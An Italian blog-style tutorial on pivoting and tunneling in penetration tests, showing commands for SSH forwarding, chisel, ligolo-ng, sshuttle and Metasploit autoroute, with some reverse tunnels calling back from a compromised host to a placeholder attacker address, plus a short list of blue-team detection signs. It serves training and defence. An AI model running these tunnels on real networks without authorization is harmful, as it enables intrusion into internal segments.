---
layout: post
title: "Pivoting e Tunneling: muoversi attraverso reti segmentate"
date: 2026-06-03
cat: red
tags: [pivoting, tunneling, chisel, ligolo-ng, sshuttle, proxychains, pentest]
excerpt: "Una volta dentro la rete perimetrale, l'attaccante deve muoversi verso segmenti interni non raggiungibili direttamente. Pivoting con chisel, ligolo-ng, sshuttle e proxychains."
---

In un engagement reale, raramente il primo host compromesso è il target finale. Più spesso è una macchina nella DMZ, da cui bisogna raggiungere reti interne. Il **pivoting** è la tecnica che permette di instradare traffico attraverso host già compromessi.

## Il problema: segmentazione di rete

```
Attaccante → [Internet] → DMZ (host A) → [Firewall] → Rete interna (host B, C, D)
```

L'attaccante può raggiungere host A direttamente. Host B, C, D sono su reti private non routable. Il pivoting trasforma host A in un relay.

## Port Forwarding SSH

Il metodo più semplice se si ha accesso SSH all'host pivot:

```bash
# Local port forwarding: porta locale → host remoto tramite pivot
ssh -L 8080:192.168.1.100:80 user@pivot

# Dynamic port forwarding: crea proxy SOCKS5 locale
ssh -D 1080 user@pivot
# poi usa proxychains
proxychains curl http://192.168.1.100/admin

# Remote port forwarding: espone porta interna verso l'attaccante
ssh -R 4444:localhost:4444 attacker@vps
```

## Chisel — tunneling via HTTP

Chisel crea tunnel TCP/UDP over HTTP, utile quando SSH è bloccato ma HTTP no:

```bash
# Sul server dell'attaccante (VPS)
chisel server -p 8080 --reverse

# Sul pivot (host compromesso)
chisel client attacker_ip:8080 R:socks

# Ora proxychains su attacker punta a 127.0.0.1:1080
proxychains nmap -sT -Pn 192.168.1.0/24
```

## Ligolo-ng — tunneling di livello 3

Ligolo-ng è il tool più moderno: crea una vera interfaccia TUN, il traffico non passa per proxychains ed è molto più veloce.

```bash
# Attaccante
./proxy -selfcert

# Sul pivot
./agent -connect attacker_ip:11601 -ignore-cert

# Nel proxy interattivo
>> session       # seleziona la sessione
>> start         # attiva il tunnel
# poi aggiungi la rotta
sudo ip route add 192.168.1.0/24 dev ligolo
```

Ora tutto il traffico verso `192.168.1.0/24` passa automaticamente attraverso il pivot — nmap, metasploit, browser, tutto.

## sshuttle — VPN over SSH

sshuttle è il più facile da usare se si ha SSH:

```bash
sshuttle -r user@pivot 192.168.1.0/24 -x pivot_ip
# Tutto il traffico verso 192.168.1.0/24 passa per pivot
```

## Pivoting con Metasploit

```bash
# Dopo aver ottenuto una sessione meterpreter
meterpreter > run autoroute -s 192.168.1.0/24
meterpreter > background

# Poi usa auxiliary modules
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > run
```

## Rilevamento del pivoting

I blue team cercano:
- Connessioni SSH con flag `-D` o `-R` (inusuali)
- Traffico HTTP verso porte non standard (chisel)
- Nuove rotte di rete su host
- Processi che aprono porte locali (`ss -tlpn`)
- Pattern di traffico anomali (volume, destinazioni)
